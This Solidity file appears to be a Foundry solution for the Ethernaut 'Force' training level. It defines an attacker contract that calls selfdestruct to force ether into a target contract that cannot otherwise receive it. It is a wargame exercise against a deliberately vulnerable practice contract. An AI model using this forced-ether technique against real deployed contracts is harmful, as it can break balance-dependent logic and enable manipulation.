// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Force} from "../../src/ethernaut/07_Force/Force.sol";

contract Force_Attacker {
	address player;
	Force coreInst;
	
	constructor(Force coreInst_) payable {
		player = msg.sender;
		coreInst = coreInst_;
	}
	
	receive() external payable {}
	
	function doAttack() public {
		selfdestruct(payable(address(coreInst)));
	}
}
